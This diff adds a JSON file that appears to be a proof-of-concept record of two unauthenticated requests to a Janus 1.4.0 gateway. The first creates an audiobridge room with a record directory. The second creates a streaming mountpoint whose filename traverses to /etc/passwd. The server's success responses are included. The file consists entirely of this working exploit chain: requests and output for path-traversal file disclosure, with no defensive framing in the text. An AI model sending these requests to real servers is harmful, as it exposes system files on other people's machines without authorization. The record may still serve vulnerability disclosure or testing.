@@ -1,0 +1,48 @@
+{
+  "note": "both requests were sent unauthenticated to a 1.4.0 build, no directory existed before step 1",
+  "step1_request": {
+    "janus": "message",
+    "body": {
+      "request": "create",
+      "record": true,
+      "record_dir": "/tmp/jpoc.mulaw",
+      "sampling_rate": 16000
+    }
+  },
+  "step1_response": {
+    "janus": "success",
+    "plugindata": {
+      "plugin": "janus.plugin.audiobridge",
+      "data": {
+        "audiobridge": "created",
+        "room": 3381786,
+        "permanent": false
+      }
+    }
+  },
+  "step2_request": {
+    "janus": "message",
+    "body": {
+      "request": "create",
+      "type": "ondemand",
+      "filename": "/tmp/jpoc.mulaw/../../etc/passwd",
+      "audio": true,
+      "video": false
+    }
+  },
+  "step2_response": {
+    "janus": "success",
+    "plugindata": {
+      "plugin": "janus.plugin.streaming",
+      "data": {
+        "streaming": "created",
+        "created": "mp-2481787",
+        "permanent": false,
+        "stream": {
+          "id": 2481787,
+          "type": "on demand"
+        }
+      }
+    }
+  }
+}
